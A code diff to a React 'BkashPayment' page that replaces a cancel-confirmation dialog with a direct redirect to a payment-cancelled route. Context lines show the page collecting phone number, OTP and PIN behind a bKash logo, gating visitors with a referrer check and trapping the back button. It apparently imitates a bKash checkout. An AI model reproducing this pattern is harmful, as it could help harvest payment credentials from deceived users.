@@ -6,7 +6,7 @@ import { useReferrerGuard } from "@/hooks/useReferrerGuard";
 import { Phone, Hand, XCircle } from "lucide-react";
 import genzLogo from "@/assets/genz-logo.png";
 import bkashLogoImg from "@/assets/bkash-logo.png";
-import CancelPaymentDialog from "@/components/CancelPaymentDialog";
+
 
 const BkashPayment = () => {
   const navigate = useNavigate();
@@ -18,7 +18,7 @@ const BkashPayment = () => {
   const [isConfirmLoading, setIsConfirmLoading] = useState(false);
   const [phoneNumber, setPhoneNumber] = useState("");
   const [showCancelView, setShowCancelView] = useState(false);
-  const [showCancelDialog, setShowCancelDialog] = useState(false);
+  
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
   const [showFailedView, setShowFailedView] = useState(false);
@@ -56,11 +56,11 @@ const BkashPayment = () => {
     window.history.pushState(null, "", window.location.href);
     const handlePopState = () => {
       window.history.pushState(null, "", window.location.href);
-      setShowCancelDialog(true);
+      navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
     };
     window.addEventListener("popstate", handlePopState);
     return () => window.removeEventListener("popstate", handlePopState);
-  }, []);
+  }, [navigate, amount]);
 
   // Initial loading effect
   useEffect(() => {
@@ -220,21 +220,12 @@ const BkashPayment = () => {
     setShowCancelView(true);
   };
 
-  const handleConfirmCancel = () => {
-    navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
-  };
-
   const handleBackFromCancel = () => {
     setShowCancelView(false);
   };
 
   const handleYesFromCancelView = () => {
-    setShowCancelView(false);
-    setShowCancelDialog(true);
-  };
-
-  const handleCancelDialogContinue = () => {
-    setShowCancelDialog(false);
+    navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
   };
 
   if (referrerChecking || isAllowed !== true) return null;
@@ -611,7 +602,7 @@ const BkashPayment = () => {
           </>
         )}
       </div>
-      <CancelPaymentDialog open={showCancelDialog} onOpenChange={(open) => { if (!open) handleCancelDialogContinue(); }} onConfirmCancel={handleConfirmCancel} />
+      
     </div>
   );
 };
